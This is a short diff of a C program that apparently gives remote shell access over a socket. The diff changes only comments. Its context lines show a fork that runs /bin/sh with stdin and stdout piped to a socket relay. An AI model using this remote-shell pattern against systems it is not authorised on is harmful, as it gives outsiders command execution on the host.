@@ -56,10 +56,10 @@ void main(int argc, char *argv[])
     pipe(in);
     pipe(out);
 
-    // new process
+    // fork process
     pid = fork();
     
-    // is this child process?
+    // if child process
     if (pid==0) 
     {
       // assign read end to stdin
@@ -75,6 +75,7 @@ void main(int argc, char *argv[])
       close(out[0]);
       close(out[1]);
       
+      // execute shell
       execve("/bin/sh", 0, 0);
     } else {      
       close(in[0]);  // close read end
@@ -147,7 +148,7 @@ void main(int argc, char *argv[])
       // shutdown socket
       shutdown(s, SHUT_RDWR);
       close(s);
-      // terminate parent      
+      // terminate shell      
       kill(pid, SIGCHLD);            
     }
     close(in[1]);
